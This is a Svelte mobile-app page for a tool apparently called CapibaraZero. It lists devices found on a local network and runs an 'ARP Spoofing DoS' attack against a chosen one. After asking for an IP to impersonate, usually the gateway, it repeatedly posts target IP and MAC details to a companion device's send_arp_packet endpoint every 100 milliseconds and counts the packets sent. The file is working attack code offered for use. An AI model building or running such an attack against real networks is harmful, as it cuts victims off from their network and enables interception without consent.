<script>
  import {
    f7,
    Page,
    Navbar,
    NavTitle,
    Button,
    Block,
    List,
    ListItem,
    Actions,
    ActionsGroup,
    ActionsLabel,
    ActionsButton,
    Popup,
    NavRight
  } from "framework7-svelte";
  import { onMount } from "svelte";
  import { CapacitorHttp } from "@capacitor/core";
  import { devices, current_net_interface } from "../../js/store.js";

  let _ip = "";

  onMount(() => {
    _ip = localStorage.getItem("ip");
  });
  console.log($devices);
  let actionsOneGroupOpened = false;
  let popupOpened = false;
  let selected_target_device;
  let attack_stopped = false;
  let sent_packets = 0;
  let arp_task;

  function stop_attack() {
    attack_stopped = true;
    popupOpened = false;
    clearInterval(arp_task);
  }

  async function start_arp_dos() {
    f7.dialog.prompt(
      "Set IP to spoof(usually default gateway. Check routes)",
      async (gateway) => {
        popupOpened = true;
        arp_task = setInterval(async function () {
          if(attack_stopped) {

          }
          const options = {
            url: "http://" + _ip + "/send_arp_packet",
            headers: { "content-type": "application/json" },
            data: {
              name: $current_net_interface.name,
              src_ip: gateway,
              target_ip: selected_target_device.ip,
              target_mac: selected_target_device.mac,
            },
          };
          console.log(options);
          try {
            await CapacitorHttp.post(options);
            sent_packets++;
          } catch (error) {
            console.log(error);
            clearInterval(arp_task);
            f7.dialog.alert("Error. The attack has been stopped");
          }
        }, 100);
      }
    );
  }
</script>

<Page name="home">
  <!-- Top Navbar -->
  <Navbar sliding={false} backLink="Back">
    <NavTitle sliding>CapibaraZero</NavTitle>
  </Navbar>
  <List dividersIos mediaList outlineIos strongIos>
    {#each $devices as device}
      <ListItem
        link="#"
        title={"Name: " + device.vendor}
        text={"IP: " + device.ip}
        subtitle={"MAC: " + device.mac}
        onClick={() => {
          selected_target_device = device;
          //   selected_ap = _ap;
          actionsOneGroupOpened = true;
        }}
      ></ListItem>
    {/each}
  </List>

  <!-- One Group -->
  <Actions bind:opened={actionsOneGroupOpened}>
    <ActionsGroup>
      <ActionsLabel>Perform an attack</ActionsLabel>
      <ActionsButton on:click={start_arp_dos}>ARP Spoofing DoS</ActionsButton>
      <ActionsButton color="red">Cancel</ActionsButton>
    </ActionsGroup>
  </Actions>

  <Popup
    class="demo-popup"
    opened={popupOpened}
    onPopupClosed={() => (popupOpened = false)}
  >
    <Page>
      <Navbar title="ARP Spoofing">
        <NavRight>
          <Button color="red" popupClose on:click={stop_attack} fill>Stop</Button>
        </NavRight>
      </Navbar>
      <Block>
        Sent packets: {sent_packets}
      </Block>
    </Page>
  </Popup>
</Page>
